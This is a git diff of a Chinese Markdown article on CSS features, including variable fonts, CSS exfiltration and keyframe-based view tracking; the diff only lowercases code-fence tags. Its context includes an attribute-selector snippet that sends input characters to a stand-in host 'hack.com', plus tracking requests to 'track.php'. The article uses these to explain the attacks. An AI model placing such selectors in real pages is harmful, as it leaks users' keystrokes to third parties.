@@ -9,7 +9,7 @@ description: 本文介绍了几种CSS中有趣的内容如变量字体、CSS攻�
 
 灵活字体（Variable fonts）是一种包含字体元信息如字宽、字重（甚至自定义形变）的字体的字体方案。主要通过使用 CSS `font-variation-settings` 属性配置变形轴，来达到使字体形变的效果，如：
 
-```CSS
+```css
 h2 {
   font-size: 64px;
   font-variation-settings: 'wght' 375;
@@ -40,7 +40,7 @@ h2 {
 
 CSS Exfil 漏洞攻击意味着攻击者可以使用选择器确定你在页面输入的按键再通过 CSS 请求将其记录，如下代码：
 
-```CSS
+```css
 input[value^=a]{
     background-image: url(http://hack.com/a);
 }
@@ -78,7 +78,7 @@ const isView = color === 'rgb(0, 0, 255)'
 
 以下是一种可能的解决方案：
 
-```CSS
+```css
 @keyframes time-count {
   0% {
     background-image: url('track.php?duration=1s');
